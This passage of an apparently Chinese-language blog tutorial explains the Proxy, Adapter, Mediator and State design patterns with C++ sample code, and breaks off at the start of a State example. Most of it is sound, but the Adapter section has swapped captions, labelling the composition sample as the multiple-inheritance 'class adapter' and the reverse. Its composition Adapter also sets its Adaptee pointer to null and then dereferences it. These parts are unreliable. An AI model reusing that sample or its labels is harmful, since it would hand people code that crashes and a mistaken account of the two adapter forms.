id="proxy">Proxy</span></h3><p>在面向对象的系统中，有些对象可能由于，对象创建开销很大、需要额外安全控制、需要进程外的访问操作等，直接访问对象会麻烦。</p><p>比如说，加载一个word文档，如果有很多图片，肯定不会希望在打开文件时就完成对所有图片的加载工作，那样会很慢。这时候，可以转化为加载一个图片的proxy代理，当浏览到该图片是，再通过proxy加载相应图片。</p><p>Proxy为其他对象提供一种代理以控制对这个对象的访问。</p><p>通常Proxy会保持原对象的接口，这个被叫做“透明操作”。但是也不一定完全保持原对象接口。</p><p>Proxy可能会作用于一个对象，也可能作用于一个大的系统，实现起来可能会很复杂。</p><blockquote><p>另一个使用场景是对用户隐藏另一种称之为copy-on-write的优化方式，该优化与根据需要创建对象有关。拷贝一个庞大而复杂的对象是一种开销很大的操作，如果这个拷贝根本没有被修改，那么这些开销就没有必要。用代理延迟这一拷贝过程，我们可以保证只有当这个对象被修改的时候才对它进行拷贝。</p><p>在实现Copy-on-write时必须对实体进行引用计数。拷贝代理仅会增加引用计数。只有当用户请求一个修改该实体的操作时，代理才会真正的拷贝它。在这种情况下，代理还必须减少实体的引用计数。当引用的数目为零时，这个实体将被删除。</p><p>Copy-on-Write可以大幅度的降低拷贝庞大实体时的开销。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/11-03-32-21f4a3.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>下面是一些可以使用 Proxy模式常见情况：</p><ol type="1"><li>远程代理（RemoteProxy）为一个对象在不同的地址空间提供局部代表。</li><li>虚代理（Virtual Proxy）根据需要创建开销很大的对象。</li><li>保护代理（ProtectionProxy）控制对原始对象的访问。保护代理用于对象应该有不同的访问权限的时候。</li><li>智能指引 （SmartReference）取代了简单的指针，它在访问对象时执行一些附加操作。它的典型用途包括：<ul><li>对指向实际对象的引用计数，这样当该对象没有引用时，可以自动释放它(也称为 Smart Pointers )。</li><li>当第一次引用一个持久对象时，将它装入内存。</li><li>在访问一个实际对象前，检查是否已经锁定了它，以确保其他对象不能改变它。</li></ul></li></ol><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Subject</span><br><span class="hljs-comment"> * defines the common interface for RealSubject and Proxy</span><br><span class="hljs-comment"> * so that a Proxy can be used anywhere a RealSubject is expected</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Subject</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Subject() &#123; <span class="hljs-comment">/* ... */</span> &#125;<br><br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Real Subject</span><br><span class="hljs-comment"> * defines the real object that the proxy represents</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RealSubject</span> :</span> <span class="hljs-keyword">public</span> Subject<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Real Subject request"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Proxy</span><br><span class="hljs-comment"> * maintains a reference that lets the proxy access the real subject</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> :</span> <span class="hljs-keyword">public</span> Subject<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  Proxy()<br>  &#123;<br>    subject = <span class="hljs-keyword">new</span> RealSubject();<br>  &#125;<br>  <br>  ~Proxy()<br>  &#123;<br>    <span class="hljs-keyword">delete</span> subject;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    subject-&gt;request();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  RealSubject *subject;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Proxy *proxy = <span class="hljs-keyword">new</span> Proxy();<br>  proxy-&gt;request();<br>  <br>  <span class="hljs-keyword">delete</span> proxy;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="adapter">Adapter</span></h3><p>在软件系统中，有时会需要将 一些现有的对象放在新的环境中使用。但是此时的接口发生了变化。</p><p>Adapter将一个类的接口转换成客户希望的另外一个接口。Adapter模式使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。也被称为Wrapper。</p><p>模式表达如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/11-15-30-dd127f.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>Adapter继承Target保持了形同接口，同时组合了一个Adaptee对象，可以调用Adaptee的方法。</p><h4><span id="抽象代码结构">抽象代码结构</span></h4><p>使用多继承的方式，类adapter。但是依然推荐组合而不是继承。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Target</span><br><span class="hljs-comment"> * defines specific interface that Client uses</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Target</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Target() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adaptee</span><br><span class="hljs-comment"> * defines an existing interface that needs adapting and thanks</span><br><span class="hljs-comment"> * to Adapter it will get calls that client makes on the Target</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adaptee</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">specificRequest</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"specific request"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adapter</span><br><span class="hljs-comment"> * implements the Target interface and when it gets a method call it</span><br><span class="hljs-comment"> * delegates the call to a Adaptee</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adapter</span> :</span> <span class="hljs-keyword">public</span> Target<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  Adapter() : adaptee() &#123;&#125;<br>  <br>  ~Adapter()<br>  &#123;<br>    <span class="hljs-keyword">delete</span> adaptee;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    adaptee-&gt;specificRequest();<br>  <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Adaptee *adaptee;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Target *t = <span class="hljs-keyword">new</span> Adapter();<br>  t-&gt;request();<br>  <span class="hljs-keyword">delete</span> t;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用组合对象，对象adapter</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Target</span><br><span class="hljs-comment"> * defines specific interface that Client uses</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Target</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Target() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adaptee</span><br><span class="hljs-comment"> * all requests get delegated to the Adaptee which defines</span><br><span class="hljs-comment"> * an existing interface that needs adapting</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adaptee</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  ~Adaptee() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">specificRequest</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"specific request"</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adapter</span><br><span class="hljs-comment"> * implements the Target interface and lets the Adaptee respond</span><br><span class="hljs-comment"> * to request on a Target by extending both classes</span><br><span class="hljs-comment"> * ie adapts the interface of Adaptee to the Target interface</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Adapter</span> :</span> <span class="hljs-keyword">public</span> Target, <span class="hljs-keyword">private</span> Adaptee<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">request</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    specificRequest();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Target *t = <span class="hljs-keyword">new</span> Adapter();<br>  t-&gt;request();<br>  <span class="hljs-keyword">delete</span> t;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="mediator">Mediator</span></h3><p>处理多个对象相互关联，并且其引用关系复杂，使得改变变得不那么容易。</p><p>Mediator用一个中介对象来封装一系列的对象交互。中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。</p><p>和Facade很相似，但是Mediator是作用于内部对象之间的，双向的关系。Facade是解耦内部对象和外部环境的，单向的关系。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/25/13-12-06-2367ab.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>图中忽略了Mediator与Colleagu之间的通信实现，这个往往是复杂的。其中可以用到Observer模式，来自动检测不同对象间的通信转换。</p><p>Mediator中有Colleague的指针成员，Colleague中有Mediator的指针成员。方便两者之间的相互调用。</p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mediator</span>;</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Colleague classes</span><br><span class="hljs-comment"> * each colleague communicates with its mediator whenever</span><br><span class="hljs-comment"> * it would have otherwise communicated with another colleague</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Colleague</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  Colleague( Mediator* <span class="hljs-keyword">const</span> m, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i ) : <br>    mediator( m ), id( i ) &#123;&#125;<br>  <br>  <span class="hljs-keyword">virtual</span> ~Colleague() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getID</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> id;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> )</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">receive</span><span class="hljs-params">( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> )</span> </span>= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">protected</span>:<br>  Mediator *mediator;<br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteColleague</span> :</span> <span class="hljs-keyword">public</span> Colleague<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ConcreteColleague( Mediator* <span class="hljs-keyword">const</span> m, <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i ) : <br>    Colleague( m, i ) &#123;&#125;<br>  <br>  ~ConcreteColleague() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">send</span><span class="hljs-params">( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg )</span></span>;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">receive</span><span class="hljs-params">( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Message '"</span> &lt;&lt; msg &lt;&lt; <span class="hljs-string">"' received by Colleague "</span> &lt;&lt; id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Mediator</span><br><span class="hljs-comment"> * defines an interface for communicating with Colleague objects</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mediator</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Mediator() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">( Colleague* <span class="hljs-keyword">const</span> c )</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">distribute</span><span class="hljs-params">( Colleague* <span class="hljs-keyword">const</span> sender, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg )</span> </span>= <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">protected</span>:<br>  Mediator() &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Mediator</span><br><span class="hljs-comment"> * implements cooperative behavior by coordinating Colleague objects</span><br><span class="hljs-comment"> * and knows its colleagues</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteMediator</span> :</span> <span class="hljs-keyword">public</span> Mediator<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcreteMediator()<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; colleagues.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> colleagues[ i ];<br>    &#125;<br>    colleagues.<span class="hljs-built_in">clear</span>();<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add</span><span class="hljs-params">( Colleague* <span class="hljs-keyword">const</span> c )</span></span><br><span class="hljs-function">  </span>&#123;<br>    colleagues.push_back( c );<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">distribute</span><span class="hljs-params">( Colleague* <span class="hljs-keyword">const</span> sender, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">for</span> ( <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; colleagues.<span class="hljs-built_in">size</span>(); i++ )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( colleagues.at( i )-&gt;getID() != sender-&gt;getID() )<br>      &#123;<br>        colleagues.at( i )-&gt;receive( msg );<br>      &#125;<br>    &#125;<br>  &#125;<br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;Colleague*&gt; colleagues;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ConcreteColleague::send</span><span class="hljs-params">( <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> msg )</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Message '"</span>&lt;&lt; msg &lt;&lt; <span class="hljs-string">"' sent by Colleague "</span> &lt;&lt; id &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  mediator-&gt;distribute( <span class="hljs-keyword">this</span>, msg );<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Mediator *mediator = <span class="hljs-keyword">new</span> ConcreteMediator();<br>  <br>  Colleague *c1 = <span class="hljs-keyword">new</span> ConcreteColleague( mediator, <span class="hljs-number">1</span> );<br>  Colleague *c2 = <span class="hljs-keyword">new</span> ConcreteColleague( mediator, <span class="hljs-number">2</span> );<br>  Colleague *c3 = <span class="hljs-keyword">new</span> ConcreteColleague( mediator, <span class="hljs-number">3</span> );<br>  <br>  mediator-&gt;add( c1 );<br>  mediator-&gt;add( c2 );<br>  mediator-&gt;add( c3 );<br>  <br>  c1-&gt;send( <span class="hljs-string">"Hi!"</span> );<br>  c3-&gt;send( <span class="hljs-string">"Hello!"</span> );<br>  <br>  <span class="hljs-keyword">delete</span> mediator;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="状态变化相关模式">状态变化相关模式</span></h2><p>关注对象状态的改变，对这些变化的状态进行管理，维持更高层模块的稳定。</p><p>典型模式：</p><ol type="1"><li>State</li><li>Memento</li></ol><h3><span id="state">State</span></h3><p>某些对象的状态如果发生改变，那么它的行为也会发生改变。比如文件的读写状态变化。</p><p>State模式允许一个对象在其内部状态改变时改变它的行为。对象看起来似乎修改了它的类。</p><p>类似Strategy模式，但是这里关注状态的变化。</p><h4><span id="示例1">示例1</span></h4><p>实现对网络连接状态的跟踪和处理。</p><p>实现一，使用条件判断，处理和转换状态。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">enum</span> NetworkState &#123;<br>    Network_Open,<br>    Network_Close,<br>    Network_Connect,<br>&#125;;<br><br><span 